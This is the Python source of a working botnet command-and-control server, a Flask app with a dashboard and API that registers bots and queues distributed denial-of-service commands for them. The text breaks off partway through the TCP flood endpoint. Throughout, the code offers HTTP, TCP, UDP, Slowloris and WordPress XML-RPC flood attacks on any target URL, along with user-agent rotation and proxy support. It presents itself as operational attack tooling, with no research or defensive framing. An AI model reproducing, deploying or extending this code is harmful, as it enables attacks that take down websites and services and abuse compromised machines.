"""
FIXED BOTNET C2 SERVER - ONLINE BOT DETECTION FIXED + ALL ATTACK METHODS
=========================================================================
FIXES:
1. Fixed online bot detection (was checking wrong time threshold)
2. Added proper bot heartbeat tracking
3. Fixed /api/stats endpoint bot counting
4. Improved last_seen timestamp updates
5. Added HTTP GET/POST/HEAD flood methods
6. Added TCP/UDP flood attack endpoints
7. Added Slowloris attack support
8. Added WordPress XML-RPC attack
9. Added user agent management
10. Added command system (ping, sysinfo, stop)

ATTACK METHODS:
- HTTP Flood (GET/POST/HEAD)
- TCP Flood
- UDP Flood
- Slowloris (Slow HTTP)
- WordPress XML-RPC Amplification
"""

import threading
import json
import time
import os
import sys
import traceback
from datetime import datetime
from functools import wraps
from typing import Dict, List, Any, Optional

try:
    from flask import Flask, render_template_string, request, jsonify, Response
    from flask_cors import CORS
    import atexit
except ImportError:
    print("[!] Install dependencies: pip install flask flask-cors")
    exit(1)

app = Flask(__name__)
CORS(app, resources={r"/*": {"origins": "*"}})

# CRITICAL FIX: Increase online threshold to 60 seconds instead of 30
ONLINE_THRESHOLD = 60  # Seconds - bot must check in within this time to be "online"
CLEANUP_THRESHOLD = 300  # 5 minutes for cleanup

@app.after_request
def add_cors_headers(response):
    """Add CORS headers to all responses"""
    response.headers.add('Access-Control-Allow-Origin', '*')
    response.headers.add('Access-Control-Allow-Headers', 'Content-Type,Authorization')
    response.headers.add('Access-Control-Allow-Methods', 'GET,PUT,POST,DELETE,OPTIONS')
    return response

@app.route('/health', methods=['GET'])
def health_check():
    """Health check endpoint for Render.com"""
    return jsonify({
        'status': 'healthy',
        'server': 'c2-server-fixed-with-methods',
        'time': datetime.now().isoformat(),
        'bots_count': len(approved_bots),
        'online_bots': sum(1 for b in approved_bots.values() if time.time() - b.get('last_seen', 0) < ONLINE_THRESHOLD)
    })

# Global storage with thread safety
approved_bots: Dict[str, Dict] = {}
commands_queue: Dict[str, List] = {}
attack_logs: List[Dict] = []
user_agents: List[str] = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
    'JavaScript-Bot/1.0 (Node.js)',
    'Java-Bot-Client/1.0',
    'Python-Bot/3.0'
]
proxy_list: List[str] = []

# Thread safety
bot_lock = threading.Lock()
log_lock = threading.Lock()
queue_lock = threading.Lock()

DASHBOARD_HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>C2 Control Panel - FIXED + ALL METHODS</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #000000 0%, #0a1929 100%);
            color: #e3f2fd;
            padding: 20px;
            min-height: 100vh;
        }
        .header {
            text-align: center;
            border: 2px solid #1976d2;
            padding: 25px;
            margin-bottom: 25px;
            background: rgba(13, 27, 42, 0.9);
            border-radius: 12px;
            box-shadow: 0 8px 32px rgba(25, 118, 210, 0.2);
        }
        .header h1 { 
            font-size: 2.2em; 
            margin-bottom: 10px; 
            color: #42a5f5;
            text-shadow: 0 0 20px rgba(66, 165, 245, 0.5);
        }
        .header p { color: #90caf9; }
        .stats {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
            margin-bottom: 25px;
        }
        .stat-box {
            border: 2px solid #1976d2;
            padding: 20px;
            background: rgba(13, 27, 42, 0.9);
            text-align: center;
            border-radius: 12px;
            box-shadow: 0 4px 16px rgba(25, 118, 210, 0.15);
            transition: all 0.3s ease;
        }
        .stat-box:hover {
            transform: translateY(-5px);
            box-shadow: 0 8px 24px rgba(25, 118, 210, 0.3);
        }
        .stat-box h3 { color: #42a5f5; margin-bottom: 10px; font-size: 0.9em; }
        .stat-box p { font-size: 2.2em; color: #90caf9; font-weight: bold; }
        .section {
            border: 2px solid #1976d2;
            padding: 25px;
            margin-bottom: 25px;
            background: rgba(13, 27, 42, 0.9);
            border-radius: 12px;
            box-shadow: 0 4px 16px rgba(25, 118, 210, 0.15);
        }
        .section h2 {
            color: #42a5f5;
            margin-bottom: 20px;
            border-bottom: 2px solid #1976d2;
            padding-bottom: 12px;
            font-size: 1.3em;
        }
        .bot-list { display: grid; gap: 12px; }
        .bot-item {
            border: 1px solid #1976d2;
            padding: 15px;
            background: rgba(13, 27, 42, 0.6);
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-radius: 8px;
            transition: all 0.3s ease;
        }
        .bot-item:hover {
            background: rgba(25, 118, 210, 0.15);
            transform: translateX(5px);
        }
        .bot-item.offline { 
            border-color: #546e7a; 
            color: #90a4ae;
            opacity: 0.6;
        }
        .bot-item.online { 
            border-color: #66bb6a;
            background: rgba(102, 187, 106, 0.1);
        }
        .status-indicator {
            display: inline-block;
            width: 12px;
            height: 12px;
            border-radius: 50%;
            margin-right: 8px;
            animation: pulse 2s infinite;
        }
        .status-online { 
            background: #66bb6a; 
            box-shadow: 0 0 15px #66bb6a;
        }
        .status-offline { 
            background: #546e7a;
            animation: none;
        }
        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.5; }
        }
        .client-type {
            display: inline-block;
            padding: 4px 12px;
            border-radius: 12px;
            font-size: 0.75em;
            margin-left: 8px;
            font-weight: bold;
        }
        .client-java { background: #ff5722; color: white; }
        .client-python { background: #1976d2; color: white; }
        .client-javascript { background: #f7df1e; color: black; }
        .client-unknown { background: #546e7a; color: white; }
        .btn {
            background: #1976d2;
            color: #fff;
            border: none;
            padding: 10px 20px;
            cursor: pointer;
            font-family: inherit;
            font-weight: 600;
            margin-left: 10px;
            border-radius: 6px;
            transition: all 0.3s ease;
        }
        .btn:hover { 
            background: #1565c0;
            transform: scale(1.05);
            box-shadow: 0 4px 12px rgba(25, 118, 210, 0.4);
        }
        .btn-danger { background: #d32f2f; }
        .btn-danger:hover { background: #c62828; }
        .btn-success { background: #2e7d32; color: white; }
        .btn-success:hover { background: #1b5e20; }
        .btn-warning { background: #f57c00; color: white; }
        .btn-warning:hover { background: #ef6c00; }
        .no-bots {
            text-align: center;
            padding: 30px;
            color: #546e7a;
            font-size: 1.1em;
        }
        .debug-info {
            background: rgba(0, 0, 0, 0.3);
            padding: 10px;
            margin-top: 10px;
            border-radius: 6px;
            font-size: 0.85em;
            color: #90caf9;
        }
        .time-diff {
            color: #ffa726;
            font-size: 0.85em;
            margin-left: 10px;
        }
        input, select, textarea {
            background: rgba(13, 27, 42, 0.8);
            border: 2px solid #1976d2;
            color: #e3f2fd;
            padding: 12px;
            font-family: inherit;
            width: 100%;
            margin: 8px 0;
            border-radius: 6px;
        }
        input:focus, select:focus, textarea:focus {
            outline: none;
            border-color: #42a5f5;
        }
        .form-group { margin-bottom: 18px; }
        .form-group label { 
            display: block; 
            margin-bottom: 8px;
            color: #90caf9;
            font-weight: 500;
        }
        textarea { 
            min-height: 120px; 
            font-size: 13px;
            font-family: 'Courier New', monospace;
        }
        .quick-commands {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
            gap: 10px;
            margin-bottom: 15px;
        }
        .log {
            max-height: 300px;
            overflow-y: auto;
            background: rgba(0, 0, 0, 0.5);
            padding: 15px;
            border: 1px solid #1976d2;
            border-radius: 6px;
        }
        .log-entry { 
            margin-bottom: 8px;
            padding: 6px;
            border-left: 3px solid #1976d2;
            padding-left: 10px;
        }
        .success { color: #66bb6a; border-left-color: #66bb6a; }
        .error { color: #ef5350; border-left-color: #ef5350; }
        .warning { color: #ffa726; border-left-color: #ffa726; }
        .info { color: #42a5f5; border-left-color: #42a5f5; }
    </style>
</head>
<body>
    <div class="header">
        <h1>🔧 C2 CONTROL PANEL - FIXED + ALL METHODS</h1>
        <p>Online Detection Fixed | Multi-Client Support | All Attack Methods</p>
        <div class="debug-info">
            Online Threshold: 60 seconds | Update Interval: 2 seconds | Current Time: <span id="current-time"></span>
        </div>
    </div>

    <div class="stats">
        <div class="stat-box">
            <h3>TOTAL BOTS</h3>
            <p id="approved-bots">0</p>
        </div>
        <div class="stat-box" style="border-color: #66bb6a;">
            <h3>🟢 ONLINE BOTS</h3>
            <p id="online-bots" style="color: #66bb6a;">0</p>
        </div>
        <div class="stat-box">
            <h3>ACTIVE ATTACKS</h3>
            <p id="active-attacks">0</p>
        </div>
        <div class="stat-box">
            <h3>TOTAL COMMANDS</h3>
            <p id="total-commands">0</p>
        </div>
    </div>

    <div class="section">
        <h2>📡 CONNECTED BOTS (Realtime Status)</h2>
        <div id="approved-list" class="bot-list">
            <div class="no-bots">Waiting for bot connections...</div>
        </div>
    </div>

    <div class="section">
        <h2>QUICK COMMANDS</h2>
        <div class="quick-commands">
            <button class="btn-success" onclick="sendPing()">PING ALL</button>
            <button class="btn-warning" onclick="sendSysInfo()">SYSINFO</button>
            <button class="btn-danger" onclick="stopAllAttacks()">STOP ALL</button>
            <button onclick="clearInactiveBots()">CLEAR OFFLINE</button>
        </div>
    </div>

    <div class="section">
        <h2>HTTP FLOOD ATTACK</h2>
        <div class="form-group">
            <label>Target URL:</label>
            <input type="text" id="http-target" placeholder="https://example.com">
        </div>
        <div class="form-group">
            <label>Threads per Bot (50-300):</label>
            <input type="number" id="http-threads" value="100" min="50" max="300">
        </div>
        <div class="form-group">
            <label>Duration (seconds):</label>
            <input type="number" id="http-duration" value="60">
        </div>
        <div class="form-group">
            <label>Method:</label>
            <select id="http-method">
                <option value="GET">GET</option>
                <option value="POST">POST</option>
                <option value="HEAD">HEAD</option>
            </select>
        </div>
        <button onclick="launchHTTPFlood()" class="btn-danger">LAUNCH HTTP FLOOD</button>
    </div>

    <div class="section">
        <h2>TCP/UDP FLOOD ATTACK</h2>
        <div class="form-group">
            <label>Target (host:port):</label>
            <input type="text" id="tcp-target" placeholder="example.com:80">
        </div>
        <div class="form-group">
            <label>Threads per Bot (50-200):</label>
            <input type="number" id="tcp-threads" value="75" min="50" max="200">
        </div>
        <div class="form-group">
            <label>Duration (seconds):</label>
            <input type="number" id="tcp-duration" value="60">
        </div>
        <div class="form-group">
            <label>Attack Type:</label>
            <select id="attack-type">
                <option value="tcp">TCP Flood</option>
                <option value="udp">UDP Flood</option>
            </select>
        </div>
        <button onclick="launchTCPUDPFlood()" class="btn-danger">LAUNCH ATTACK</button>
    </div>

    <div class="section">
        <h2>SLOWLORIS ATTACK</h2>
        <div class="form-group">
            <label>Target URL:</label>
            <input type="text" id="slowloris-target" placeholder="https://example.com">
        </div>
        <div class="form-group">
            <label>Connections per Bot:</label>
            <input type="number" id="slowloris-connections" value="200" min="50" max="500">
        </div>
        <div class="form-group">
            <label>Duration (seconds):</label>
            <input type="number" id="slowloris-duration" value="120">
        </div>
        <button onclick="launchSlowloris()" class="btn-danger">LAUNCH SLOWLORIS</button>
    </div>

    <div class="section">
        <h2>WORDPRESS XML-RPC ATTACK</h2>
        <div class="form-group">
            <label>WordPress Site URL:</label>
            <input type="text" id="wp-target" placeholder="https://wordpress-site.com">
        </div>
        <div class="form-group">
            <label>Threads per Bot:</label>
            <input type="number" id="wp-threads" value="50" min="10" max="100">
        </div>
        <div class="form-group">
            <label>Duration (seconds):</label>
            <input type="number" id="wp-duration" value="60">
        </div>
        <button onclick="launchWordPress()" class="btn-danger">LAUNCH WP ATTACK</button>
    </div>

    <div class="section">
        <h2>MANAGE USER AGENTS</h2>
        <div class="form-group">
            <label>User Agents (one per line):</label>
            <textarea id="user-agents" placeholder="Mozilla/5.0..."></textarea>
        </div>
        <button onclick="updateUserAgents()">UPDATE USER AGENTS</button>
    </div>

    <div class="section">
        <h2>ACTIVITY LOGS</h2>
        <div style="margin-bottom: 10px;">
            <button onclick="clearLogs()">CLEAR LOGS</button>
            <button onclick="exportLogs()">EXPORT LOGS</button>
        </div>
        <div id="logs" class="log"></div>
    </div>

    <script>
        function updateCurrentTime() {
            const now = new Date();
            document.getElementById('current-time').textContent = now.toLocaleTimeString();
        }
        
        setInterval(updateCurrentTime, 1000);
        updateCurrentTime();

        function updateStats() {
            fetch('/api/stats')
                .then(r => r.json())
                .then(data => {
                    document.getElementById('approved-bots').textContent = data.approved_bots;
                    document.getElementById('online-bots').textContent = data.online_bots;
                    document.getElementById('active-attacks').textContent = data.active_attacks;
                    document.getElementById('total-commands').textContent = data.total_commands || 0;
                    
                    document.getElementById('user-agents').value = data.user_agents.join('\\n');
                    
                    const approvedList = document.getElementById('approved-list');
                    approvedList.innerHTML = '';
                    
                    if(data.approved.length === 0) {
                        approvedList.innerHTML = '<div class="no-bots">No bots connected.</div>';
                    } else {
                        data.approved.forEach(bot => {
                            const div = document.createElement('div');
                            const statusClass = bot.online ? 'online' : 'offline';
                            const statusIndicator = bot.online ? 'status-online' : 'status-offline';
                            const clientType = bot.client_type || 'unknown';
                            const clientTypeClass = 'client-' + clientType;
                            
                            div.className = `bot-item ${statusClass}`;
                            div.innerHTML = `
                                <div>
                                    <span class="status-indicator ${statusIndicator}"></span>
                                    <strong>[${bot.bot_id}]</strong> 
                                    <span class="client-type ${clientTypeClass}">${clientType.toUpperCase()}</span>
                                    - ${bot.specs.cpu_cores || '?'} cores, ${bot.specs.ram_gb || '?'}GB RAM - 
                                    ${bot.specs.os || 'unknown'}
                                    <span class="time-diff">(${bot.time_diff}s ago)</span><br>
                                    <small style="margin-left: 28px;">
                                        Status: <strong>${bot.status || 'idle'}</strong> | 
                                        Last seen: ${bot.last_seen} | 
                                        ${bot.online ? '🟢 ONLINE' : '🔴 OFFLINE'}
                                    </small>
                                </div>
                                <button class="btn btn-danger" onclick="removeBot('${bot.bot_id}')">REMOVE</button>
                            `;
                            approvedList.appendChild(div);
                        });
                    }
                    
                    const logsDiv = document.getElementById('logs');
                    if(data.logs.length === 0) {
                        logsDiv.innerHTML = '<div style="text-align:center;color:#546e7a;">No activity yet</div>';
                    } else {
                        logsDiv.innerHTML = data.logs.slice(-30).reverse().map(log => {
                            const logClass = log.type;
                            return `<div class="log-entry ${logClass}">[${log.time}] ${log.message}</div>`;
                        }).join('');
                    }
                })
                .catch(err => console.error('Error fetching stats:', err));
        }

        function sendPing() {
            fetch('/api/command/ping', { method: 'POST' })
            .then(r => r.json())
            .then(data => { alert(data.message); updateStats(); });
        }

        function sendSysInfo() {
            fetch('/api/command/sysinfo', { method: 'POST' })
            .then(r => r.json())
            .then(data => { alert(data.message); updateStats(); });
        }

        function stopAllAttacks() {
            if(confirm('Stop all active attacks?')) {
                fetch('/api/command/stop', { method: 'POST' })
                .then(r => r.json())
                .then(data => { alert(data.message); updateStats(); });
            }
        }

        function clearInactiveBots() {
            if(confirm('Clear all offline bots?')) {
                fetch('/api/clear/inactive', {method: 'POST'})
                    .then(r => r.json())
                    .then(data => { alert(data.message); updateStats(); });
            }
        }

        function removeBot(botId) {
            if(confirm('Remove bot: ' + botId + '?')) {
                fetch('/api/remove/' + botId, {method: 'POST'})
                    .then(r => r.json())
                    .then(data => { alert(data.message); updateStats(); });
            }
        }

        function updateUserAgents() {
            const agents = document.getElementById('user-agents').value;
            fetch('/api/user-agents', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ user_agents: agents })
            })
            .then(r => r.json())
            .then(data => { alert(data.message); updateStats(); });
        }

        function launchHTTPFlood() {
            const target = document.getElementById('http-target').value;
            const duration = document.getElementById('http-duration').value;
            const threads = document.getElementById('http-threads').value;
            const method = document.getElementById('http-method').value;
            
            if (!target) { alert('Please enter target URL'); return; }
            
            if(confirm(`Launch HTTP ${method} flood to ${target}?`)) {
                fetch('/api/attack/http', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ target, duration, threads, method })
                })
                .then(r => r.json())
                .then(data => { alert(data.message); updateStats(); });
            }
        }

        function launchTCPUDPFlood() {
            const target = document.getElementById('tcp-target').value;
            const duration = document.getElementById('tcp-duration').value;
            const threads = document.getElementById('tcp-threads').value;
            const attackType = document.getElementById('attack-type').value;
            
            if (!target) { alert('Please enter target'); return; }
            
            if(confirm(`Launch ${attackType.toUpperCase()} flood to ${target}?`)) {
                const endpoint = attackType === 'tcp' ? '/api/attack/tcp' : '/api/attack/udp';
                fetch(endpoint, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ target, duration, threads })
                })
                .then(r => r.json())
                .then(data => { alert(data.message); updateStats(); });
            }
        }

        function launchSlowloris() {
            const target = document.getElementById('slowloris-target').value;
            const connections = document.getElementById('slowloris-connections').value;
            const duration = document.getElementById('slowloris-duration').value;
            
            if (!target) { alert('Please enter target URL'); return; }
            
            if(confirm(`Launch Slowloris attack to ${target}?`)) {
                fetch('/api/attack/slowloris', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ target, connections, duration })
                })
                .then(r => r.json())
                .then(data => { alert(data.message); updateStats(); });
            }
        }

        function launchWordPress() {
            const target = document.getElementById('wp-target').value;
            const threads = document.getElementById('wp-threads').value;
            const duration = document.getElementById('wp-duration').value;
            
            if (!target) { alert('Please enter WordPress URL'); return; }
            
            if(confirm(`Launch WordPress XML-RPC attack to ${target}?`)) {
                fetch('/api/attack/wordpress', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ target, threads, duration })
                })
                .then(r => r.json())
                .then(data => { alert(data.message); updateStats(); });
            }
        }

        function clearLogs() {
            if(confirm('Clear all logs?')) {
                fetch('/api/logs/clear', { method: 'POST' })
                    .then(r => r.json())
                    .then(data => { alert(data.message); updateStats(); });
            }
        }

        function exportLogs() {
            fetch('/api/logs/export')
                .then(r => r.text())
                .then(data => {
                    const blob = new Blob([data], { type: 'text/plain' });
                    const url = window.URL.createObjectURL(blob);
                    const a = document.createElement('a');
                    a.href = url;
                    a.download = `c2-logs-${new Date().toISOString().slice(0,10)}.txt`;
                    document.body.appendChild(a);
                    a.click();
                    document.body.removeChild(a);
                    window.URL.revokeObjectURL(url);
                });
        }

        setInterval(updateStats, 2000);
        updateStats();
    </script>
</body>
</html>
"""

def synchronized(lock):
    def decorator(func):
        @wraps(func)
        def wrapper(*args, **kwargs):
            with lock:
                return func(*args, **kwargs)
        return wrapper
    return decorator

def log_activity(message: str, log_type: str = 'info', client_type: str = None):
    """Add log entry with thread safety"""
    with log_lock:
        log_entry = {
            'time': datetime.now().strftime('%H:%M:%S'),
            'type': log_type,
            'message': message
        }
        if client_type:
            log_entry['client_type'] = client_type
        attack_logs.append(log_entry)
        
        if len(attack_logs) > 1000:
            attack_logs.pop(0)

@app.route('/')
def dashboard():
    return render_template_string(DASHBOARD_HTML)

def detect_client_type(specs: Dict) -> str:
    """Detect if client is Java, Python, or JavaScript based on specs"""
    try:
        if specs.get('client_type'):
            return specs['client_type'].lower()
        
        capabilities = specs.get('capabilities', {})
        if capabilities.get('javascript'):
            return 'javascript'
        elif capabilities.get('java'):
            return 'java'
        elif capabilities.get('python'):
            return 'python'
        
        user_agent = specs.get('user_agent', '').lower()
        if 'javascript' in user_agent or 'node' in user_agent or 'js' in user_agent:
            return 'javascript'
        elif 'java' in user_agent or 'jdk' in user_agent:
            return 'java'
        elif 'python' in user_agent:
            return 'python'
        
        return 'unknown'
    except:
        return 'unknown'

@app.route('/check_approval', methods=['POST', 'OPTIONS'])
def check_approval():
    """Auto-approve bots with client type detection"""
    if request.method == 'OPTIONS':
        return '', 200
    
    try:
        data = request.json
        if not data:
            return jsonify({'approved': False, 'error': 'No data'}), 400
            
        bot_id = data.get('bot_id')
        specs = data.get('specs', {})
        
        if not bot_id:
            return jsonify({'approved': False, 'error': 'No bot_id'}), 400
        
        current_time = time.time()
        client_type = detect_client_type(specs)
        
        with bot_lock:
            if bot_id not in approved_bots:
                approved_bots[bot_id] = {
                    'specs': specs,
                    'last_seen': current_time,
                    'status': 'connected',
                    'approved_at': current_time,
                    'client_type': client_type,
                    'stats': data.get('stats', {}),
                    'commands_received': 0
                }
                
                log_message = f'Bot connected: {bot_id} - {client_type.upper()} client'
                log_activity(log_message, 'success', client_type)
                print(f"[+] {log_message} at {datetime.now().strftime('%H:%M:%S')}")
            else:
                approved_bots[bot_id]['last_seen'] = current_time
                approved_bots[bot_id]['client_type'] = client_type
                
                if approved_bots[bot_id].get('status') == 'disconnected':
                    approved_bots[bot_id]['status'] = 'reconnected'
                    log_message = f'Bot reconnected: {bot_id} - {client_type.upper()}'
                    log_activity(log_message, 'success', client_type)
                    print(f"[+] {log_message}")
        
        return jsonify({'approved': True, 'client_type': client_type})
    except Exception as e:
        error_msg = f'Error in check_approval: {str(e)}'
        log_activity(error_msg, 'error')
        print(f"[!] {error_msg}")
        return jsonify({'approved': False, 'error': str(e)}), 500

@app.route('/commands/<bot_id>', methods=['GET', 'OPTIONS'])
def get_commands(bot_id):
    """Get commands for specific bot - UPDATES LAST_SEEN"""
    if request.method == 'OPTIONS':
        return '', 200
    
    try:
        current_time = time.time()
        with bot_lock:
            if bot_id in approved_bots:
                approved_bots[bot_id]['last_seen'] = current_time
        
        with queue_lock:
            commands = commands_queue.get(bot_id, [])
            commands_queue[bot_id] = []
            
            if bot_id in approved_bots and commands:
                approved_bots[bot_id]['commands_received'] = approved_bots[bot_id].get('commands_received', 0) + len(commands)
        
        return jsonify({'commands': commands})
    except Exception as e:
        error_msg = f'Error in get_commands for {bot_id}: {str(e)}'
        log_activity(error_msg, 'error')
        print(f"[!] {error_msg}")
        return jsonify({'commands': []}), 500

@app.route('/status', methods=['POST', 'OPTIONS'])
def receive_status():
    """Receive status updates from bots - UPDATES LAST_SEEN"""
    if request.method == 'OPTIONS':
        return '', 200
    
    try:
        data = request.json
        if not data:
            return jsonify({'status': 'error', 'message': 'No data'}), 400
            
        bot_id = data.get('bot_id')
        status = data.get('status', 'unknown')
        message = data.get('message', '')
        
        current_time = time.time()
        with bot_lock:
            if bot_id in approved_bots:
                approved_bots[bot_id]['status'] = status
                approved_bots[bot_id]['last_seen'] = current_time
                
                if 'stats' in data:
                    approved_bots[bot_id]['stats'] = data['stats']
        
        client_type = approved_bots.get(bot_id, {}).get('client_type', 'unknown')
        log_message = f"{bot_id} ({client_type}): {status} - {message}"
        log_activity(log_message, status, client_type)
        
        return jsonify({'status': 'ok'})
    except Exception as e:
        error_msg = f'Error in receive_status: {str(e)}'
        log_activity(error_msg, 'error')
        print(f"[!] {error_msg}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/remove/<bot_id>', methods=['POST', 'OPTIONS'])
def remove_bot(bot_id):
    """Remove specific bot"""
    if request.method == 'OPTIONS':
        return '', 200
    
    try:
        with bot_lock:
            if bot_id in approved_bots:
                client_type = approved_bots[bot_id].get('client_type', 'unknown')
                del approved_bots[bot_id]
                
                with queue_lock:
                    if bot_id in commands_queue:
                        del commands_queue[bot_id]
                
                log_message = f'Bot removed: {bot_id} - {client_type.upper()}'
                log_activity(log_message, 'error', client_type)
                print(f"[-] {log_message}")
                return jsonify({'status': 'success', 'message': f'Bot {bot_id} removed'})
        
        return jsonify({'status': 'error', 'message': 'Bot not found'}), 404
    except Exception as e:
        error_msg = f'Error in remove_bot: {str(e)}'
        log_activity(error_msg, 'error')
        print(f"[!] {error_msg}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/clear/inactive', methods=['POST', 'OPTIONS'])
def clear_inactive_bots():
    """Clear inactive bots"""
    if request.method == 'OPTIONS':
        return '', 200
    
    try:
        current_time = time.time()
        removed_count = 0
        
        with bot_lock:
            bots_to_remove = []
            for bot_id, info in list(approved_bots.items()):
                try:
                    last_seen = info.get('last_seen', 0)
                    time_diff = current_time - last_seen
                    if time_diff > CLEANUP_THRESHOLD:
                        bots_to_remove.append(bot_id)
                except:
                    continue
            
            for bot_id in bots_to_remove:
                del approved_bots[bot_id]
                
                with queue_lock:
                    if bot_id in commands_queue:
                        del commands_queue[bot_id]
                
                removed_count += 1
        
        return jsonify({'status': 'success', 'message': f'Removed {removed_count} inactive bots'})
    except Exception as e:
        error_msg = f'Error in clear_inactive_bots: {str(e)}'
        log_activity(error_msg, 'error')
        print(f"[!] {error_msg}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/stats', methods=['GET', 'OPTIONS'])
def get_stats():
    """Get server statistics - FIXED ONLINE DETECTION"""
    if request.method == 'OPTIONS':
        return '', 200
    
    try:
        current_time = time.time()
        online_bots = 0
        java_clients = 0
        python_clients = 0
        javascript_clients = 0
        active_attacks = 0
        total_commands = 0
        
        approved_list = []
        
        with bot_lock:
            for bot_id, info in list(approved_bots.items()):
                try:
                    last_seen = info.get('last_seen', 0)
                    time_diff = current_time - last_seen
                    
                    is_online = time_diff < ONLINE_THRESHOLD
                    
                    client_type = info.get('client_type', 'unknown')
                    status = info.get('status', 'unknown')
                    specs = info.get('specs', {})
                    
                    if is_online:
                        online_bots += 1
                        
                        if status == 'running':
                            active_attacks += 1
                        
                        if client_type == 'java':
                            java_clients += 1
                        elif client_type == 'python':
                            python_clients += 1
                        elif client_type == 'javascript':
                            javascript_clients += 1
                        
                        total_commands += info.get('commands_received', 0)
                    else:
                        if info.get('status') != 'offline':
                            info['status'] = 'offline'
                    
                    approved_list.append({
                        'bot_id': bot_id,
                        'specs': {
                            'cpu_cores': specs.get('cpu_cores', '?'),
                            'ram_gb': specs.get('ram_gb', '?'),
                            'os': specs.get('os', 'unknown')
                        },
                        'status': status,
                        'last_seen': time.strftime('%H:%M:%S', time.localtime(last_seen)),
                        'online': is_online,
                        'client_type': client_type,
                        'time_diff': int(time_diff)
                    })
                    
                except Exception as e:
                    print(f"[!] Error processing bot {bot_id}: {e}")
                    continue
        
        with log_lock:
            recent_logs = attack_logs[-50:]
        
        result = {
            'approved_bots': len(approved_bots),
            'online_bots': online_bots,
            'java_clients': java_clients,
            'python_clients': python_clients,
            'javascript_clients': javascript_clients,
            'active_attacks': active_attacks,
            'total_commands': total_commands,
            'user_agents_count': len(user_agents),
            'approved': approved_list,
            'logs': recent_logs,
            'user_agents': user_agents,
            'proxies': proxy_list
        }
        
        return jsonify(result)
        
    except Exception as e:
        error_msg = f'Error in get_stats: {str(e)}'
        log_activity(error_msg, 'error')
        print(f"[!] {error_msg}")
        return jsonify({
            'approved_bots': 0,
            'online_bots': 0,
            'java_clients': 0,
            'python_clients': 0,
            'javascript_clients': 0,
            'active_attacks': 0,
            'total_commands': 0,
            'user_agents_count': 0,
            'approved': [],
            'logs': [],
            'user_agents': [],
            'proxies': []
        }), 500

def get_online_bots():
    """Get list of online bot IDs"""
    current_time = time.time()
    online_bots = []
    
    with bot_lock:
        for bot_id, info in approved_bots.items():
            try:
                last_seen = info.get('last_seen', 0)
                if current_time - last_seen < ONLINE_THRESHOLD:
                    online_bots.append(bot_id)
            except:
                continue
    
    return online_bots

@app.route('/api/user-agents', methods=['GET', 'POST', 'OPTIONS'])
def manage_user_agents():
    """Manage user agents"""
    if request.method == 'OPTIONS':
        return '', 200
    
    global user_agents
    
    try:
        if request.method == 'POST':
            data = request.json
            agents_text = data.get('user_agents', '')
            new_agents = [line.strip() for line in agents_text.split('\n') if line.strip()]
            
            if new_agents:
                user_agents = new_agents
                log_activity(f'Updated {len(user_agents)} user agents', 'info')
                print(f"[+] Updated {len(user_agents)} user agents")
                return jsonify({'status': 'success', 'message': f'Updated {len(user_agents)} user agents'})
            
            return jsonify({'status': 'error', 'message': 'No valid user agents provided'}), 400
        
        return jsonify({'user_agents': user_agents})
    except Exception as e:
        error_msg = f'Error in manage_user_agents: {str(e)}'
        log_activity(error_msg, 'error')
        print(f"[!] {error_msg}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/attack/http', methods=['POST', 'OPTIONS'])
def launch_http_attack():
    """Launch HTTP flood attack"""
    if request.method == 'OPTIONS':
        return '', 200
    
    try:
        data = request.json
        
        target = data.get('target')
        duration = int(data.get('duration', 60))
        threads = int(data.get('threads', 100))
        method = data.get('method', 'GET')
        
        if not target:
            return jsonify({'status': 'error', 'message': 'No target specified'}), 400
        
        target_bots = get_online_bots()
        
        if not target_bots:
            return jsonify({'status': 'error', 'message': 'No online bots available'}), 400
        
        sent_count = 0
        
        with queue_lock:
            for bot_id in target_bots:
                command = {
                    'type': 'http_flood',
                    'target': target,
                    'duration': duration,
                    'threads': threads,
                    'method': method,
                    'user_agents': user_agents,
                    'proxies': proxy_list
                }
                
                if bot_id not in commands_queue:
                    commands_queue[bot_id] = []
                commands_queue[bot_id].append(command)
                sent_count += 1
        
        log_message = f'HTTP {method} flood to {sent_count} bots -> {target} ({threads} threads)'
        log_activity(log_message, 'warning')
        
        print(f"[+] {log_message}")
        return jsonify({'status': 'success', 'message': f'HTTP flood sent to {sent_count} bots', 'sent_count': sent_count})
    except Exception as e:
        error_msg = f'Error in launch_http_attack: {str(e)}'
        log_activity(error_msg, 'error')
        print(f"[!] {error_msg}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/attack/tcp', methods=['POST', 'OPTIONS'])
def launch_tcp_attack():
    """Launch TCP flood attack"""
    if request.method == 'OPTIONS':
        return '', 200
    
    try:
        data = request.json
        
        target = data.get('target')
        duration = int(data.get('duration', 60))
        threads = int(data.get('threads', 75))
        
        if not target:
            return jsonify({'status': 'error', 'message': 'No target specified'}), 400
        
        target_bots = get_online_bots()
        
        if not target_bots:
            return jsonify({'status': 'error', 'message': 'No online bots available'}), 400
        
        sent_count = 0
        
        with queue_lock:
            for bot_id in target_bots:
                command = {
